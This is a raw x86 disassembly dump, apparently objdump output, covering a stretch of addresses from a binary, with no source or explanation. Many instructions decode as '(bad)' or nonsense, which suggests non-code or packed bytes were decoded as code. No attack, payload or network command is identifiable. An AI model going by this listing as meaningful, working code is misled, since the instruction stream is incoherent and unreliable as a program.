  413909:	out    dx,al
  41390a:	push   ebx
  41390b:	fwait
  41390c:	add    bh,bh
  41390e:	add    BYTE PTR [edx],bh
  413910:	pop    esp
  413911:	(bad)  
  413912:	inc    DWORD PTR [eax]
  413914:	jmp    DWORD PTR [edx-0x1]
  413917:	jle    0x413930
  413919:	cmp    BYTE PTR [ecx],0x59
  41391c:	add    DWORD PTR [eax],0x0
  41391f:	call   0xc538e6
  413924:	dec    DWORD PTR [edx+0x3d001089]
  41392a:	mov    cl,0xf6
  41392c:	cmp    edi,0xffffff83
  41392f:	test   eax,0xffff0002
  413934:	call   FWORD PTR [edx-0xe47ad01]
  41393a:	outs   dx,BYTE PTR ds:[esi]
  41393b:	das    
  41393c:	inc    DWORD PTR [eax]
  41393e:	call   DWORD PTR [edx-0xff0069]
  413944:	inc    DWORD PTR [edi-0x41f3734]
  41394a:	or     al,BYTE PTR [edi+0x5e00cc00]
  413950:	fld    QWORD PTR [ebx-0x197d0000]
  413956:	jmp    FWORD PTR [ebp+edx*4-0xb]
  41395a:	push   ss
  41395b:	loop   0x4138e0
  41395d:	(bad)  
  41395e:	inc    edx
  413960:	push   ecx
  413961:	(bad)  
  413962:	inc    DWORD PTR [eax]
  413964:	add    BYTE PTR [ecx+0x0],bh
  413967:	push   ecx
  413968:	test   eax,0x4189a0
  41396d:	add    bh,bh
  41396f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413970:	retf   
  413971:	add    bh,bh
  413973:	add    BYTE PTR [ebx-0x11e3001d],al
  413979:	dec    ecx
  41397a:	shl    dl,0xff
  41397d:	add    bh,bh
  41397f:	sub    ch,BYTE PTR [eax-0x34]
  413982:	dec    esp
  413984:	or     DWORD PTR [ebp-0x34],0x16
  413988:	pop    esi
  413989:	loop   0x4139d0
  41398b:	aam    0xff
  41398d:	(bad)  
  41398e:	jmp    FWORD PTR [edx-0x7c33ff84]
  413994:	jmp    FWORD PTR [eax-0x15268600]
  41399a:	in     al,dx
  41399b:	inc    ebp
  41399c:	add    BYTE PTR [eax],al
  41399e:	add    BYTE PTR [ebx+esi*1-0x333301],ch
  4139a5:	dec    DWORD PTR [ecx-0x3671723a]
  4139ab:	inc    ecx
  4139ac:	add    BYTE PTR [eax],al
  4139ae:	int3   
  4139af:	pop    edi
  4139b0:	aam    0xcc
  4139b2:	(bad)  
  4139b3:	(bad)  
  4139b4:	(bad)  
  4139b5:	jmp    0xb812:0x9ddddaff
  4139bc:	int3   
  4139bd:	add    bh,bh
  4139bf:	xchg   esi,eax
  4139c0:	xchg   esp,ecx
  4139c2:	add    bh,bh
  4139c4:	(bad)  
  4139c5:	mov    eax,0xa4c768ff
  4139ca:	out    dx,eax
  4139cb:	gs (bad) 
  4139cd:	inc    DWORD PTR [eax]
  4139cf:	xchg   ecx,eax
  4139d0:	inc    ecx
  4139d1:	cmp    edi,0xffffffff
  4139d4:	add    ch,cl
  4139d6:	(bad)  
  4139d7:	clc    
  4139d8:	not    DWORD PTR [edi]
  4139da:	push   eax
  4139db:	xor    edi,edi
  4139dd:	add    bh,bh
  4139df:	sbb    esp,DWORD PTR [edi+edi*8]
  4139e2:	add    BYTE PTR [ebx-0x3dffa000],al
  4139e8:	mov    edx,0xff456c56
  4139ed:	add    bh,bh
  4139ef:	ds dec ecx
  4139f1:	dec    DWORD PTR [ecx+0x8283ff]
  4139f7:	outs   dx,DWORD PTR ds:[esi]
  4139f8:	xlat   BYTE PTR ds:[ebx]
  4139f9:	rcl    DWORD PTR [ebx+0x0],0xff
  4139fd:	add    bh,bh
  4139ff:	push   ds
  413a00:	dec    esi
  413a01:	inc    DWORD PTR [eax]
  413a03:	inc    DWORD PTR [eax]
  413a05:	sub    edi,edi
  413a07:	ds shr bl,1
  413a0a:	(bad)  
  413a0b:	call   0x3423910
  413a10:	xchg   edi,eax
  413a11:	(bad)  
  413a12:	(bad)  
  413a13:	(bad)  
  413a14:	jmp    DWORD PTR [ebp+0x74207289]
  413a1a:	xor    al,0xb5
  413a1c:	(bad)  
  413a1d:	(bad)  
  413a1e:	call   FWORD PTR [edx+0xcc10]
  413a24:	push   edx
  413a26:	add    BYTE PTR [eax-0xa90f422],ch
  413a2c:	inc    DWORD PTR [eax]
  413a2e:	jmp    FWORD PTR [ebx-0xe]
  413a31:	add    bh,bh
  413a33:	(bad)  
  413a34:	call   DWORD PTR [eax+eax*1]
  413a37:	or     al,0x3d
  413a39:	sub    DWORD PTR [edx-0x60],esp
  413a3c:	add    bh,bh
  413a3e:	(bad)  
  413a3f:	jmp    0xff423a40
  413a44:	dec    ebx
  413a46:	jmp    FWORD PTR [ecx+edi*1]
  413a49:	push   esp
  413a4a:	retf   
  413a4b:	clc    
  413a4c:	cmp    edi,0xffffffff
  413a4f:	clc    
  413a50:	or     al,0x83
  413a52:	(bad)  
  413a53:	dec    DWORD PTR [ecx+0x490f833f]
  413a59:	ds add dh,al
  413a5c:	add    BYTE PTR [ecx-0x5c4600],cl
  413a62:	inc    DWORD PTR [ebx-0x51003f00]
  413a68:	inc    esp
  413a69:	and    eax,0xffcc5046
  413a6e:	add    BYTE PTR [edi+0x36],bl
  413a71:	int3   
  413a72:	add    bh,bh
  413a74:	dec    DWORD PTR [ebx+0x6e4a1000]
  413a7a:	out    dx,eax
  413a7b:	test   bh,bh
  413a7d:	add    BYTE PTR [eax],al
  413a7f:	push   ss
  413a80:	jle    0x413a82
  413a82:	add    BYTE PTR [ebx-0x197c0600],al
  413a88:	fwait
  413a89:	cli    
  413a8a:	add    al,0xf3
  413a8c:	inc    DWORD PTR [eax]
  413a8e:	push   DWORD PTR [esi-0x7caa]
  413a94:	add    bl,ah
  413a96:	int3   
  413a97:	stc    
  413a98:	rol    bl,1
  413a9a:	dec    esi
  413a9b:	call   0x64:0xab008900
  413aa2:	inc    DWORD PTR [eax]
  413aa4:	add    BYTE PTR [edi],dl
  413aa6:	push   DWORD PTR [esi]
  413aa8:	xor    esi,DWORD PTR [ebp-0x7c00be01]
  413aae:	add    BYTE PTR ds:0xffff8987,al
  413ab4:	mov    DWORD PTR [edi+0x0],esi
  413ab7:	push   0x74
  413ab9:	bound  edx,QWORD PTR [esi+eiz*1+0x0]
  413abd:	cmp    edi,0xffffff81
  413ac0:	mov    ds:0x89cc83ff,eax
  413ac5:	test   al,0xcc
  413ac7:	add    al,0xb6
  413ac9:	fcmovnu st,st(6)
  413acb:	sub    edi,edi
  413acd:	inc    DWORD PTR [eax]
  413acf:	scas   eax,DWORD PTR es:[edi]
  413ad0:	mov    ebx,0xffffffcc
  413ad5:	loope  0x413ad6
  413ad7:	lods   eax,DWORD PTR ds:[esi]
  413ad8:	int3   
  413ad9:	enter  0xcded,0xff
  413add:	inc    DWORD PTR [eax]
  413adf:	adc    bl,BYTE PTR [edi+edi*8]
  413ae2:	add    BYTE PTR [eax],al
  413ae4:	adc    DWORD PTR [eax-0x7004d901],0x31
  413aeb:	repnz add BYTE PTR [eax],al
  413aee:	inc    DWORD PTR [edi+esi*8-0x7cff0001]
  413af5:	mov    ebx,0xbd4c9383
  413afa:	pop    esp
  413afb:	in     al,0x0
  413afd:	add    ah,cl
  413aff:	call   0x39ff:0xff00ff31
  413b06:	or     DWORD PTR [edx-0x65],0xffffffcd
  413b0a:	mov    ecx,DWORD PTR [ebp+0x6f0000ff]
  413b10:	retf   0x8383
  413b13:	(bad)  
  413b14:	(bad)  
  413b15:	jle    0x413ae3
  413b17:	ret    0x40c3
  413b1a:	mov    edi,0xf5
  413b1f:	loope  0x413b9b
  413b21:	(bad)  
  413b22:	inc    DWORD PTR [ebx+0x1bff36cc]
  413b28:	ins    BYTE PTR es:[edi],dx
  413b29:	adc    ch,BYTE PTR [edi]
  413b2b:	ror    esp,0x0
  413b2e:	push   DWORD PTR [ebx-0x760f]
  413b34:	add    BYTE PTR [edx-0x48ed807d],bh
  413b3a:	frstor [eax]
  413b3c:	cmp    edi,0xffffff89
  413b3f:	add    ebx,edi
  413b41:	int3   
  413b42:	int3   
  413b43:	inc    DWORD PTR [eax]
  413b45:	jmp    0x5c34:0x9c32a0cc
  413b4c:	add    bh,bh
  413b4e:	dec    DWORD PTR [edx-0x26]
  413b51:	mov    esp,ecx
  413b53:	add    BYTE PTR [eax],al
  413b55:	sar    edi,cl
  413b57:	hlt    
  413b58:	pusha  
  413b59:	out    0x84,al
  413b5b:	sar    edi,0xff
  413b5e:	add    BYTE PTR [ebp-0x65],al
  413b61:	inc    DWORD PTR [eax]
  413b63:	int3   
  413b64:	(bad)  
  413b65:	(bad)  
  413b67:	pop    eax
  413b68:	popa   
  413b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b6c:	add    BYTE PTR [ebx-0xd1d401],al
  413b72:	add    bh,bh
  413b74:	int3   
  413b75:	sub    al,0x0
  413b77:	mov    edi,0x6a42db2d
  413b7c:	(bad)  
  413b7d:	(bad)  
  413b7e:	jmp    FWORD PTR [edi]
  413b80:	push   ebx
  413b81:	inc    DWORD PTR [eax]
  413b83:	int3   
  413b84:	push   DWORD PTR [ebx+0x0]
  413b87:	cmp    DWORD PTR [edx],0xffe2aca5
  413b8d:	dec    esp
  413b8f:	push   eax
  413b90:	rol    DWORD PTR [ebx+0x57ffff83],0xff
  413b97:	jno    0x413c02
  413b99:	mov    ebx,0xff839078
  413b9e:	jmp    FWORD PTR [eax+0xffea]
  413ba4:	jmp    FWORD PTR [esi+0x39b6b500]
  413baa:	imul   esp,DWORD PTR [esp+ecx*8],0x2f5700ff
  413bb1:	mov    DWORD PTR [eax],eax
  413bb3:	int3   
  413bb4:	int3   
  413bb5:	cmp    eax,0xcea8c300
  413bba:	rcr    DWORD PTR [esi+0x5b838900],1
  413bc0:	add    eax,0x83000000
  413bc5:	leave  
  413bc6:	call   FWORD PTR [eax+0x18]
  413bc9:	push   0x89ffe67b
  413bce:	int3   
  413bcf:	iret   
  413bd0:	lds    ecx,FWORD PTR [ecx+0x30ffff00]
  413bd6:	add    BYTE PTR [ebp-0x5f],dh
  413bd9:	icebp  
  413bda:	mov    dh,0xfe
  413bdc:	dec    DWORD PTR [ecx-0x7c84bf01]
  413be2:	dec    esp
  413be4:	push   edx
  413be6:	(bad)  
  413be7:	ds inc ebp
  413be9:	(bad)  
  413bea:	pop    eax
  413beb:	jnp    0x413bec
  413bed:	add    BYTE PTR [eax],al
  413bef:	sbb    al,0xd7
  413bf1:	add    BYTE PTR [eax],al
  413bf3:	mov    DWORD PTR [ebx-0x4c7133d1],eax
  413bf9:	test   eax,0xff003024
  413bfe:	(bad)  
  413bff:	out    dx,al
  413c00:	xchg   esi,eax
  413c01:	(bad)  
  413c02:	inc    DWORD PTR [eax]
  413c04:	add    BYTE PTR [edi+edi*8],cl
  413c07:	aas    
  413c08:	push   es
  413c09:	xor    DWORD PTR [esi+eax*1-0x1],eax
  413c0d:	mov    DWORD PTR [ecx-0x7c332835],ecx
  413c13:	cmp    edi,0x37
  413c16:	jmp    edi
  413c18:	inc    ebp
  413c19:	xlat   BYTE PTR ds:[ebx]
  413c1a:	and    ah,ch
  413c1c:	inc    DWORD PTR [eax]
  413c1e:	int3   
  413c1f:	shr    DWORD PTR [edx],cl
  413c21:	dec    esp
  413c23:	inc    DWORD PTR [eax]
  413c25:	adc    eax,DWORD PTR [eax]
  413c27:	xor    ebx,ecx
  413c29:	add    ch,BYTE PTR [ebp+0xff0008]
  413c2f:	mov    ah,0x4
  413c31:	add    DWORD PTR [eax],0xffffffff
  413c34:	push   edi
  413c36:	xor    DWORD PTR [esp+ecx*8],0x6c
  413c3a:	(bad)  
  413c3b:	adc    al,BYTE PTR [eax]
  413c3d:	add    DWORD PTR [ebx-0x76569c],0xffffffff
  413c44:	add    BYTE PTR [ebx-0x34],bl
  413c47:	sbb    ebp,edi
  413c49:	sub    BYTE PTR [ebx-0xff0039],dh
  413c4f:	cmp    eax,0x8900ff65
  413c54:	xor    DWORD PTR [ecx],0xffffffff
  413c57:	aam    0xc5
  413c59:	sbb    BYTE PTR [edi-0x6b],dl
  413c5c:	(bad)  
  413c5d:	inc    DWORD PTR [eax]
  413c5f:	jp     0x413cd5
  413c61:	cmp    edi,0x0
  413c64:	add    BYTE PTR [esi+0x0],cl
  413c67:	xor    BYTE PTR [edx+esi*4+0x5734],al
  413c6e:	add    DWORD PTR [eax+0x14],0xffffffff
  413c72:	inc    DWORD PTR [eax]
  413c74:	add    dl,dh
  413c76:	push   DWORD PTR [ebp-0x36b1f701]
  413c7c:	or     DWORD PTR [ecx+0x778800],0xffffff83
  413c83:	add    BYTE PTR [ebx-0x58050055],al
  413c89:	ss mov ah,0x70
  413c8c:	(bad)  
  413c8d:	(bad)  
  413c8e:	inc    DWORD PTR [esi+0x75]
  413c91:	(bad)  
  413c92:	dec    esp
  413c94:	jmp    esp
  413c96:	(bad)  
  413c97:	mov    eax,0x286a01cf
  413c9c:	mov    esp,ecx
  413c9e:	call   DWORD PTR [esi]
  413ca0:	enter  0xccff,0xff
  413ca4:	add    ebp,0xffffffcc
  413ca7:	das    
  413ca8:	or     dl,dh
  413caa:	mov    ch,BYTE PTR [ebp-0x7d]
  413cad:	inc    DWORD PTR [eax]
  413caf:	outs   dx,BYTE PTR ds:[esi]
  413cb0:	xchg   bh,bh
  413cb2:	inc    DWORD PTR [ebx+0x6eff6bff]
  413cb8:	push   edi
  413cb9:	sbb    al,0xa
  413cbb:	inc    eax
  413cbc:	inc    DWORD PTR [eax]
  413cbe:	int3   
  413cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cc0:	pop    ebx
  413cc1:	mov    DWORD PTR [ebx-0x8aff01],eax
  413cc7:	ds (bad) 
  413cc9:	data16 aad 0x8e
  413ccc:	(bad)  
  413ccd:	(bad)  
  413cce:	jmp    DWORD PTR [ebx-0x7c000034]
  413cd4:	adc    esi,0x0
  413cd7:	push   eax
  413cd8:	and    al,0x3e
  413cda:	mov    al,ds:0xcc8300f7
  413cdf:	je     0x413c71
  413ce1:	inc    DWORD PTR [eax]
  413ce3:	add    bh,bh
  413ce5:	outs   dx,DWORD PTR ds:[esi]
  413ce6:	add    BYTE PTR [esi],bl
  413ce8:	das    
  413ce9:	mov    al,0x4f
  413ceb:	pop    ecx
  413cec:	inc    DWORD PTR [eax]
  413cee:	and    DWORD PTR [esi],0x6c
  413cf1:	mov    edi,edi
  413cf3:	inc    DWORD PTR [eax]
  413cf5:	(bad)  
  413cf6:	(bad)  
  413cf7:	cmp    esi,eax
  413cf9:	mov    eax,ds:0x5ee7
  413cfe:	xor    DWORD PTR [esi+ebx*8],0xffffff83
  413d02:	int3   
  413d03:	add    BYTE PTR [ecx+0x79248352],cl
  413d09:	pushf  
  413d0a:	(bad)  
  413d0b:	(bad)  
  413d0e:	jmp    ecx
  413d10:	sbb    eax,0x838989cc
  413d15:	cmp    al,BYTE PTR [eax]
  413d17:	pop    ss
  413d18:	dec    edx
  413d19:	mov    esi,0x8902db
  413d1e:	jmp    DWORD PTR [edi+0x24]
  413d21:	int3   
  413d22:	inc    DWORD PTR [eax]
  413d24:	add    BYTE PTR [edi+edi*8+0x1b],dh
  413d28:	push   ebp
  413d29:	out    dx,al
  413d2a:	cmp    DWORD PTR [edx-0x7f76ff01],esp
  413d30:	mov    BYTE PTR [eax],al
  413d32:	add    ah,cl
  413d34:	jmp    FWORD PTR [eax]
  413d36:	add    bl,al
  413d38:	cld    
  413d39:	mov    ah,0x84
  413d3b:	aas    
  413d3c:	inc    DWORD PTR [eax]
  413d3e:	call   DWORD PTR [edx+eiz*8-0x7d]
  413d42:	add    BYTE PTR [eax],al
  413d44:	add    BYTE PTR [edx],dh
  413d46:	int3   
  413d47:	ins    DWORD PTR es:[edi],dx
  413d48:	mov    edx,0xff77e307
  413d4d:	add    bh,bh
  413d4f:	jb     0x413d61
  413d51:	(bad)  
  413d52:	inc    DWORD PTR [ebx-0x3e00e400]
  413d58:	jmp    0x11bc8ac
  413d5d:	mov    edi,edi
  413d5f:	fldcw  WORD PTR [edx+0x0]
  413d62:	(bad)  
  413d63:	(bad)  
  413d64:	jmp    DWORD PTR [edx-0x1]
  413d67:	fadd   st(3),st
  413d69:	mov    bh,0xf5
  413d6b:	xchg   edi,edi
  413d6d:	inc    DWORD PTR [ebx+0x83084b]
  413d73:	inc    DWORD PTR [ebx-0x365900ab]
  413d79:	loopne 0x413d23
  413d7b:	xchg   ebp,eax
  413d7c:	inc    DWORD PTR [eax]
  413d7e:	add    BYTE PTR [edi],ah
  413d80:	and    eax,0xffffffff
  413d85:	adc    eax,DWORD PTR [eax]
  413d87:	icebp  
  413d88:	fs inc eax
  413d8a:	pop    es
  413d8b:	cmp    eax,0x1bff83ff
  413d90:	adc    eax,0xcc8300ff
  413d95:	int    0x0
  413d97:	and    al,0x7e
  413d99:	test   edx,eax
  413d9b:	cld    
  413d9c:	add    BYTE PTR [eax],al
  413d9e:	push   DWORD PTR [eax]
  413da0:	mov    bh,0x0
  413da2:	(bad)  
  413da3:	inc    DWORD PTR [eax]
  413da5:	loope  0x413da6
  413da7:	dec    eax
  413da8:	mov    es,WORD PTR [eax-0x7c336f27]
  413dae:	add    BYTE PTR [ecx-0x4b],bh
  413db1:	add    bh,bh
  413db3:	add    BYTE PTR [ebx-0x54f500b3],al
  413db9:	ret    
  413dba:	xchg   ebp,eax
  413dbb:	in     eax,0xff
  413dbd:	inc    DWORD PTR [eax]
  413dbf:	(bad)  
  413dc0:	mov    al,0xff
  413dc2:	add    BYTE PTR [eax],al
  413dc4:	(bad)  
  413dc5:	cld    
  413dc6:	add    bh,al
  413dc8:	mov    ah,0x9
  413dca:	cli    
  413dcb:	push   es
  413dcc:	mov    DWORD PTR [ecx-0x7cf84534],ecx
  413dd2:	add    bh,bh
  413dd4:	add    BYTE PTR [edi],ah
  413dd6:	call   esp
  413dd8:	push   cs
  413dd9:	cdq    
  413dda:	mov    ebx,ebx
  413ddc:	add    DWORD PTR [eax],0xffffff83
  413ddf:	dec    esi
  413de0:	jo     0x413de1
  413de2:	inc    DWORD PTR [eax]
  413de4:	mov    DWORD PTR [eax+eax*1-0x4f],eax
  413de8:	test   al,0x4d
  413dea:	push   es
  413deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dec:	(bad)  
  413ded:	inc    DWORD PTR [eax]
  413def:	int3   
  413df0:	(bad)  
  413df2:	add    BYTE PTR [eax],al
  413df4:	adc    DWORD PTR [eax+eax*1],0xffffffd8
  413df8:	test   al,0x21
  413dfa:	lds    ebp,FWORD PTR [ebx+0x328389ff]
  413e00:	xchg   ebx,eax
  413e01:	inc    DWORD PTR [ebx-0x7c570001]
  413e07:	fstp   QWORD PTR [edx+ecx*2+0x21]
  413e0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e0c:	inc    DWORD PTR [eax]
  413e0e:	jmp    FWORD PTR [esi+0x5b]
  413e11:	add    BYTE PTR [eax],al
  413e13:	inc    DWORD PTR [eax]
  413e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e16:	(bad)  
  413e17:	jle    0x413df4
  413e19:	mov    cl,0xb8
  413e1b:	(bad)  
  413e1d:	add    BYTE PTR [ecx-0x7c00bc4e],cl
  413e23:	inc    DWORD PTR [eax]
  413e25:	cmp    bh,0xd6
  413e28:	xchg   ebp,eax
  413e29:	outs   dx,BYTE PTR ds:[esi]
  413e2a:	sti    
  413e2b:	cmp    DWORD PTR [eax],eax
  413e2d:	add    DWORD PTR [eax],0x53
  413e30:	loop   0x413dbb
  413e32:	(bad)  
  413e33:	inc    DWORD PTR [eax]
  413e35:	sar    edi,1
  413e37:	jo     0x413e4b
  413e39:	xor    eax,0xffff9c8b
  413e3e:	or     DWORD PTR ds:0xff00ffb2,0xffffff89
  413e45:	jp     0x413e46
  413e47:	cmp    BYTE PTR [edx+0x12],dl
  413e4a:	hlt    
  413e4b:	mov    ds:0x8fffff83,al
  413e50:	jns    0x413e52
  413e52:	mov    edi,edi
  413e54:	(bad)  
  413e55:	mov    ebx,0x8fd62b00
  413e5a:	(bad)  
  413e5b:	add    cl,ah
  413e5d:	mov    edi,edi
  413e5f:	sar    di,cl
  413e62:	(bad)  
  413e63:	inc    DWORD PTR [eax]
  413e65:	xchg   ecx,eax
  413e66:	cmp    DWORD PTR [ebx+0x74],0x15
  413e6a:	pop    es
  413e6b:	jle    0x413e6d
  413e6d:	add    bh,bh
  413e6f:	jbe    0x413ea0
  413e71:	int3   
  413e72:	add    BYTE PTR [ebx-0x7c00337d],al
  413e78:	or     dl,BYTE PTR [esi]
  413e7a:	add    BYTE PTR [edx-0x1],ah
  413e7d:	(bad)  
  413e7e:	push   ebx
  413e80:	add    edi,edi
  413e82:	add    ah,cl
  413e84:	add    BYTE PTR [esi-0x7d],ah
  413e87:	das    
  413e88:	cmp    esi,esp
  413e8a:	dec    ecx
  413e8b:	jns    0x413e10
  413e8d:	dec    DWORD PTR [ecx+0xff34fe]
  413e93:	mov    DWORD PTR [ebx+0x4492ff1f],eax
  413e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e9a:	or     DWORD PTR [ebx-0x2a7d0000],0xff00ffc8
  413ea4:	(bad)  
  413ea5:	out    dx,eax
  413ea6:	add    BYTE PTR ds:0xa9ca20d5,ah
  413eac:	dec    esp
  413eae:	add    BYTE PTR [esi],ch
  413eb0:	pop    ds
  413eb1:	(bad)  
  413eb2:	(bad)  
  413eb3:	(bad)  
  413eb4:	push   DWORD PTR [ebp-0x7d]
  413eb7:	cwde   
  413eb8:	dec    ebx
  413eb9:	xor    dh,BYTE PTR [eax-0x58]
  413ebc:	inc    DWORD PTR [eax]
  413ebe:	jmp    FWORD PTR [ebp-0x7c00ff86]
  413ec4:	and    DWORD PTR [ebx],0x0
  413ec7:	or     eax,0x97200586
  413ecc:	inc    DWORD PTR [eax]
  413ece:	add    BYTE PTR [edx-0x33008e],dh
  413ed4:	add    BYTE PTR [ebx-0x72be6700],al
  413eda:	nop
  413edb:	pop    ecx
  413edc:	add    bh,bh
  413ede:	add    BYTE PTR [ebx],bl
  413ee0:	mov    BYTE PTR [eax],0x0
  413ee3:	inc    DWORD PTR [eax]
  413ee5:	push   esp
  413ee6:	call   DWORD PTR [esi]
  413ee8:	jecxz  0x413ee8
  413eea:	dec    ebp
  413eeb:	mov    edi,edi
  413eed:	(bad)  
  413eee:	(bad)  
  413eef:	cmp    eax,0x83ff836e
  413ef4:	add    ch,ah
  413ef6:	add    dh,al
  413ef8:	mov    ah,0x6
  413efa:	scas   eax,DWORD PTR es:[edi]
  413efb:	ss add bh,bh
  413efe:	mov    DWORD PTR [ebp-0x36],esp
  413f01:	(bad)  
  413f02:	inc    DWORD PTR [eax]
  413f04:	sbb    DWORD PTR [edi-0x3f417001],0x41
  413f0b:	mov    ebp,0x45ff0000
  413f10:	gs (bad) 
  413f12:	dec    esp
  413f14:	mov    DWORD PTR [esi-0x5487c600],esi
  413f1a:	mov    ecx,esp
  413f1c:	int3   
  413f1d:	or     esp,0x37
  413f20:	add    eax,0xff83ffff
  413f25:	cmc    
  413f26:	int3   
  413f27:	adc    eax,0xf53f8967
  413f2c:	(bad)  
  413f2d:	inc    DWORD PTR [eax]
  413f2f:	xor    al,0xcd
  413f31:	mov    edi,edi
  413f33:	(bad)  
  413f34:	inc    DWORD PTR [edi+0x3550d989]
  413f3a:	std    
  413f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f3c:	add    BYTE PTR [eax],al
  413f3e:	add    BYTE PTR [ebx],al
  413f40:	inc    edx
  413f41:	int3   
  413f42:	add    BYTE PTR [ebx-0x257c1501],al
  413f48:	xchg   esi,eax
  413f49:	xchg   DWORD PTR [ecx-0x7cffffdd],eax
  413f4f:	xchg   esp,eax
  413f50:	cmp    edi,edi
  413f52:	(bad)  
  413f53:	(bad)  
  413f54:	dec    DWORD PTR [edi+edi*8+0x34]
  413f58:	cmp    BYTE PTR gs:[esi-0xff88],bh
  413f5f:	(bad)  
  413f61:	add    bh,bh
  413f63:	add    bh,bh
  413f65:	das    
  413f66:	inc    eax
  413f68:	fcomi  st,st(0)
  413f6a:	sahf   
  413f6b:	xchg   edx,eax
  413f6c:	mov    DWORD PTR [eax],eax
  413f6e:	jmp    DWORD PTR [ebp-0x7c000027]
  413f74:	add    BYTE PTR [esi],al
  413f76:	call   DWORD PTR [edi+0x4]
  413f79:	sub    esi,DWORD PTR [edi-0x56]
  413f7f:	xchg   ecx,edx
  413f81:	(bad)  
  413f82:	inc    DWORD PTR [eax]
  413f84:	mov    edx,ebx
  413f86:	call   FWORD PTR [ebp-0x29]
  413f89:	pop    edi
  413f8a:	dec    edx
  413f8b:	mov    cl,0xff
  413f8d:	inc    DWORD PTR [ebx-0xa060]
  413f93:	add    bh,bh
  413f95:	loopne 0x413f96
  413f97:	iret   
  413f98:	hlt    
  413f99:	jle    0x413f54
  413f9b:	ret    0x0
  413f9e:	jmp    FWORD PTR [ecx]
  413fa0:	cmp    al,0x0
  413fa2:	add    BYTE PTR [ebx-0x7b00a17d],al
  413fa8:	mov    gs,WORD PTR [edi+0x59]
  413fab:	iret   
  413fac:	inc    DWORD PTR [ebx-0xae3600]
  413fb2:	inc    DWORD PTR [ebx+0x6dff2e00]
  413fb8:	fs mov eax,0x8c78
  413fbe:	push   edi
  413fc0:	inc    DWORD PTR cs:[eax]
  413fc3:	(bad)  
  413fc4:	call   ebx
  413fc6:	call   DWORD PTR [esi-0x7bcdc5da]
  413fcc:	(bad)  
  413fcd:	(bad)  
  413fce:	dec    DWORD PTR [esi]
  413fd0:	rol    DWORD PTR [ebx-0x7fff0100],1
  413fd6:	call   FWORD PTR [ebx-0xa317ab7]
  413fdc:	(bad)  
  413fdd:	inc    DWORD PTR [eax]
  413fdf:	xchg   edx,eax
  413fe0:	pop    ss
  413fe1:	(bad)  
  413fe2:	(bad)  
  413fe3:	inc    DWORD PTR [ebx+0x3d0f0096]
  413fe9:	xchg   esp,eax
  413fea:	test   al,0x92
  413fec:	inc    DWORD PTR [eax]
  413fee:	push   DWORD PTR [ebx+0x1b]
  413ff1:	(bad)  
  413ff2:	inc    DWORD PTR [eax]
  413ff4:	mov    DWORD PTR [edi-0x34],esi
  413ff7:	(bad)  
  413ff8:	je     0x413fd9
  413ffa:	pop    ss
  413ffb:	data16 add BYTE PTR [eax],al
  413ffe:	add    BYTE PTR [eax-0x41],bh
  414001:	int3   
  414002:	cmp    edi,0xffffffcc
  414005:	cs inc edx
  414008:	jns    0x414053
  41400a:	cwde   
  41400b:	stos   BYTE PTR es:[edi],al
  41400c:	(bad)  
  41400d:	dec    DWORD PTR [ecx-0x76001cdf]
  414013:	add    bh,bh
  414015:	je     0x413f9a
  414017:	mov    ah,BYTE PTR [eax-0x35]
  41401a:	mov    bl,0xa6
  41401c:	add    bh,bh
  41401e:	push   DWORD PTR [esi]
  414020:	mov    edi,edi
  414022:	cmp    edi,0xffffffff
  414025:	cmp    edi,edi
  414027:	xor    dl,BYTE PTR [ebx-0x44]
  41402a:	int3   
  41402b:	mov    ch,0x0
  41402d:	add    bh,bh
  41402f:	pop    eax
  414030:	jl     0x414032
  414032:	(bad)  
  414033:	inc    DWORD PTR [ebx+0x785aff05]
  414039:	in     eax,0xad
  41403b:	pusha  
  41403c:	add    BYTE PTR [ebx-0x7c3ccd01],al
  414042:	add    bh,bh
  414044:	add    BYTE PTR ds:0x4f603dcc,bl
  41404a:	pushf  
  41404b:	lock add ah,cl
  41404e:	jmp    FWORD PTR [ebx]
  414050:	arpl   WORD PTR [eax],ax
  414052:	add    ah,cl
  414054:	cmp    eax,0xffffff83
  414057:	mov    ebp,0xaebbfcb4
  41405c:	add    bh,bh
  41405e:	add    BYTE PTR [ecx],bl
  414060:	inc    ebx
  414061:	(bad)  
  414062:	inc    DWORD PTR [ebx-0x6008301]
  414068:	add    DWORD PTR [edx-0x34],edx
  41406b:	out    dx,al
  41406c:	cmp    edi,0xffffffcc
  41406f:	add    eax,0xff0083e1
  414074:	int3   
  414075:	fcos   
  414077:	adc    al,0x62
  414079:	adc    al,0xeb
  41407b:	mov    ds:0x40ffff00,eax
  414080:	push   esi
  414081:	(bad)  
  414082:	inc    DWORD PTR [ebx-0x33000b00]
  414088:	bound  ebp,QWORD PTR [ebx]
  41408a:	pushf  
  41408b:	xor    al,0x0
  41408d:	mov    DWORD PTR [eax],eax
  41408f:	arpl   WORD PTR [ebp-0x34],cx
  414092:	cmp    edi,0xffffffff
  414095:	js     0x414096
  414097:	or     DWORD PTR [ebp+0x6b],esp
  41409a:	test   DWORD PTR [edi+edi*8],ebp
  41409d:	add    bh,bh
  41409f:	xchg   edx,esi
  4140a1:	inc    DWORD PTR [eax]
  4140a3:	add    bh,bh
  4140a5:	sahf   
  4140a6:	add    BYTE PTR [ebx+0x6888d2ff],ah
  4140ac:	mov    esp,ecx
  4140ae:	call   FWORD PTR [esi+edx*2-0x1]
  4140b2:	inc    DWORD PTR [eax]
  4140b4:	add    BYTE PTR [edi],cl
  4140b6:	add    BYTE PTR [ebx+0x65],ch
  4140b9:	daa    
  4140ba:	jp     0x414112
  4140bc:	add    bh,bh
  4140be:	mov    DWORD PTR [edx],ebx
  4140c0:	sbb    edi,edi
  4140c2:	inc    DWORD PTR [ebx-0x8008c01]
  4140c8:	cmp    ah,BYTE PTR ds:0x83ff05f1
  4140ce:	adc    DWORD PTR [eax+0x1],0x0
  4140d2:	add    DWORD PTR [eax],0x0
  4140d5:	sbb    edi,edi
  4140d7:	mov    ds:0x72009192,eax
  4140dc:	inc    DWORD PTR [eax]
  4140de:	add    BYTE PTR [eax-0x58],ch
